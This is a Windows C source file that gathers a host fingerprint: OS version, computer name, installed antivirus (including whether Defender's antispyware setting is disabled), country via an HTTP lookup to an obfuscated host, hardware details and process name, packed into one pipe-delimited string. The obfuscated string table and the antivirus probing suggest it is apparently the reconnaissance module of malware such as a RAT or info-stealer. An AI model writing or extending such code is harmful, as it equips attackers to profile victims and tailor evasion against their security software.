#include "sysinfo.h"
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <psapi.h>
#include "utils.h"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "psapi.lib")

static char* reg_read_sz(HKEY key, const char* subkey, const char* value) {
    HKEY hKey; if (RegOpenKeyExA(key, subkey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) return NULL;
    DWORD size = 0; if (RegQueryValueExA(hKey, value, NULL, NULL, NULL, &size) != ERROR_SUCCESS) { RegCloseKey(hKey); return NULL; }
    char* buf = (char*)malloc(size); if (RegQueryValueExA(hKey, value, NULL, NULL, (LPBYTE)buf, &size) != ERROR_SUCCESS) { free(buf); RegCloseKey(hKey); return NULL; }
    RegCloseKey(hKey); return buf;
}

static char* get_win_version() {
    char* product = reg_read_sz(HKEY_LOCAL_MACHINE, s(KSTR_REG_WIN_KEY), s(KSTR_REG_PROD_NAME));
    char* build   = reg_read_sz(HKEY_LOCAL_MACHINE, s(KSTR_REG_WIN_KEY), s(KSTR_REG_BUILD));
    char* display = reg_read_sz(HKEY_LOCAL_MACHINE, s(KSTR_REG_WIN_KEY), s(KSTR_REG_DISPLAY));
    if (!display) display = reg_read_sz(HKEY_LOCAL_MACHINE, s(KSTR_REG_WIN_KEY), s(KSTR_REG_RELEASE));
    char* result = (char*)malloc(256); sprintf(result, "%s %s (Build %s)", product ? product : "Windows", display ? display : "", build ? build : "");
    if (product) free(product); if (build) free(build); if (display) free(display); return result;
}

static char* get_antivirus() {
    const char* av_list[] = {"Avast", "AVG", "Bitdefender", "Kaspersky", "McAfee", "Norton", "ESET", "Trend Micro", "Malwarebytes", NULL};
    for (int i = 0; av_list[i] != NULL; i++) {
        HKEY hKey; char key[128]; sprintf(key, "%s\\%s", s(KSTR_REG_AV_BASE), av_list[i]);
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) { RegCloseKey(hKey); return _strdup(av_list[i]); }
    }
    char* disabled = reg_read_sz(HKEY_LOCAL_MACHINE, s(KSTR_REG_DEFENDER_KEY), s(KSTR_REG_DIS_SPY));
    if (disabled && strcmp(disabled, "1") == 0) { free(disabled); return _strdup(s(KSTR_UNKNOWN)); }
    if (disabled) free(disabled); return _strdup(s(KSTR_WIN_DEF));
}

static char* get_country() {
    WCHAR ua[64], host[64], path[64];
    MultiByteToWideChar(CP_ACP, 0, s(KSTR_HTTP_UA), -1, ua, 64);
    MultiByteToWideChar(CP_ACP, 0, s(KSTR_HTTP_HOST), -1, host, 64);
    MultiByteToWideChar(CP_ACP, 0, s(KSTR_HTTP_PATH), -1, path, 64);
    HINTERNET hSession = WinHttpOpen(ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return _strdup(s(KSTR_COUNTRY_NA));
    HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return _strdup(s(KSTR_COUNTRY_NA)); }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return _strdup(s(KSTR_COUNTRY_NA)); }
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD size = 0; WinHttpQueryDataAvailable(hRequest, &size);
        if (size > 0) {
            char* buf = (char*)malloc(size + 1); DWORD read = 0; WinHttpReadData(hRequest, buf, size, &read); buf[read] = 0;
            char* p = buf + strlen(buf) - 1; while (p >= buf && (*p == '\r' || *p == '\n' || *p == ' ')) *p-- = 0;
            WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return buf;
        }
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return _strdup(s(KSTR_COUNTRY_NA));
}

static char* get_gpu() {
    char* gpu = reg_read_sz(HKEY_LOCAL_MACHINE, s(KSTR_REG_GPU_KEY), s(KSTR_REG_GPU_DESC));
    if (!gpu) { char alt_key[256]; sprintf(alt_key, "%s\\0001", s(KSTR_REG_GPU_KEY)); gpu = reg_read_sz(HKEY_LOCAL_MACHINE, alt_key, s(KSTR_REG_GPU_DESC)); }
    return gpu ? gpu : _strdup(s(KSTR_UNKNOWN));
}

static char* get_cpu() {
    char* cpu = reg_read_sz(HKEY_LOCAL_MACHINE, s(KSTR_REG_CPU_KEY), s(KSTR_REG_CPU_NAME));
    if (cpu) { char* p = cpu; while (*p == ' ') p++; char* trim = _strdup(p); free(cpu); return trim; }
    return _strdup(s(KSTR_UNKNOWN));
}

static char* get_ram() {
    MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms); GlobalMemoryStatusEx(&ms);
    ULONGLONG totalMB = ms.ullTotalPhys / (1024ULL * 1024ULL); ULONGLONG freeMB = ms.ullAvailPhys / (1024ULL * 1024ULL);
    char* buf = (char*)malloc(64);
    if (totalMB >= 1024) sprintf(buf, "%.1f GB free / %.1f GB total", (double)freeMB / 1024.0, (double)totalMB / 1024.0);
    else sprintf(buf, "%llu MB free / %llu MB total", freeMB, totalMB);
    return buf;
}

static char* get_disk() {
    ULARGE_INTEGER freeBytesAvail, totalBytes, totalFreeBytes;
    if (!GetDiskFreeSpaceExA(s(KSTR_C_DRIVE), &freeBytesAvail, &totalBytes, &totalFreeBytes)) return _strdup(s(KSTR_UNKNOWN));
    double totalGB = (double)totalBytes.QuadPart / (1024.0 * 1024.0 * 1024.0); double freeGB = (double)totalFreeBytes.QuadPart / (1024.0 * 1024.0 * 1024.0);
    char* buf = (char*)malloc(64); sprintf(buf, "%.1f GB free / %.1f GB total", freeGB, totalGB); return buf;
}

static char* get_process_name() {
    char path[MAX_PATH] = {0}; GetModuleFileNameA(NULL, path, MAX_PATH); char* last = strrchr(path, '\\'); return _strdup(last ? last + 1 : path);
}

char* collect_sysinfo() {
    char* win = get_win_version(); char computer[MAX_COMPUTERNAME_LENGTH + 1]; DWORD csize = sizeof(computer); GetComputerNameA(computer, &csize);
    char* av = get_antivirus(); char* country = get_country(); char* gpu = get_gpu(); char* cpu = get_cpu(); char* ram = get_ram(); char* disk = get_disk(); char* proc = get_process_name();
    size_t len = strlen(win) + strlen(computer) + strlen(av) + strlen(country) + strlen(gpu) + strlen(cpu) + strlen(ram) + strlen(disk) + strlen(proc) + 16;
    char* res = (char*)malloc(len); sprintf(res, "%s|%s|%s|%s|%s|%s|%s|%s|%s", win, computer, av, country, gpu, cpu, ram, disk, proc);
    free(win); free(av); free(country); free(gpu); free(cpu); free(ram); free(disk); free(proc); return res;
}
